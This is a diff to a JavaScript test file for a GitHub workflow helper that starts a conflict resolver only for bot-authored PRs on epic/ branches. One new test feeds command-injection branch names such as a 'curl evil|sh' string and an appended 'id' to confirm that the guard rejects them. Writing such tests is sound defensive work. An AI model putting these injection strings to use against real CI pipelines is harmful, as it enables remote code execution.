@@ -3,7 +3,7 @@ import assert from 'node:assert/strict'
 import { readFileSync } from 'node:fs'
 import { mergeableState, startConflictResolver, resolverReply, replyIfConflicting } from './epic-conflict-resolver.mjs'
 
-const pr = { head: { sha: 'abc', ref: 'epic/12-x' } }
+const pr = { user: { login: 'nuxt-harness[bot]' }, head: { sha: 'abc', ref: 'epic/12-x' } }
 function fake({ comments = [], fail = false } = {}) {
   const calls = { comments: [], dispatch: [] }
   return { calls, github: {
@@ -14,7 +14,7 @@ function fake({ comments = [], fail = false } = {}) {
     } } }
 }
 const guard = async (_d, fn) => fn()
-const go = (f, state = 'dirty', now = Date.now()) => startConflictResolver({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, pr, state, handoffGuard: guard, now })
+const go = (f, state = 'dirty', now = Date.now()) => startConflictResolver({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, pr: f.pr || pr, state, handoffGuard: guard, now })
 
 test('dirty + no marker → marker comment + dispatch', async () => {
   const f = fake(); const r = await go(f)
@@ -49,7 +49,7 @@ test('unknown then dirty → retried, then dispatch', async () => {
 test('replyIfConflicting: unknown then dirty → resolver once, "merging main in first" reply', async () => {
   const seq = ['unknown', 'dirty']; let i = 0
   const f = fake()
-  f.github.rest.pulls = { get: async () => ({ data: { state: 'open', merged: false, mergeable_state: seq[i++], head: pr.head } }) }
+  f.github.rest.pulls = { get: async () => ({ data: { state: 'open', merged: false, mergeable_state: seq[i++], head: pr.head, user: pr.user } }) }
   const said = []
   const done = await replyIfConflicting({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, handoffGuard: guard, say: async m => said.push(m), sleep: async () => {} })
   assert.equal(done, true)
@@ -65,4 +65,21 @@ test('both workflows call the shared helper (real YAML)', () => {
   }
   const oc = readFileSync(new URL('../../.github/workflows/on-comment.yml', import.meta.url), 'utf8')
   assert.ok(oc.indexOf("replyIfConflicting") < oc.indexOf('Approved — merges when the checks finish'))
+})
+test('non-bot PR author → resolver not started, reply says why', async () => {
+  const f = fake(); f.pr = { ...pr, user: { login: 'rando' } }
+  const r = await go(f)
+  assert.equal(r.status, 'not-pipeline'); assert.equal(f.calls.dispatch.length, 0); assert.equal(f.calls.comments.length, 0)
+  assert.match(resolverReply(r, 'epic/12-x'), /not a pipeline PR — resolve the conflict by hand/)
+})
+test('bot PR whose branch is not epic/… → not started (also via replyIfConflicting)', async () => {
+  for (const ref of ['work-5', 'x"; curl evil|sh #', 'epic/12-x"; id']) {
+    const f = fake(); f.pr = { ...pr, head: { sha: 'abc', ref } }
+    assert.equal((await go(f)).status, 'not-pipeline'); assert.equal(f.calls.dispatch.length, 0)
+  }
+  const f = fake(); const bad = { ...pr, head: { sha: 'abc', ref: 'feature/x' } }
+  f.github.rest.pulls = { get: async () => ({ data: { state: 'open', merged: false, mergeable_state: 'dirty', head: bad.head, user: bad.user } }) }
+  const said = []
+  await replyIfConflicting({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, handoffGuard: guard, say: async m => said.push(m), sleep: async () => {} })
+  assert.equal(f.calls.dispatch.length, 0); assert.match(said[0], /resolve the conflict by hand/)
 })
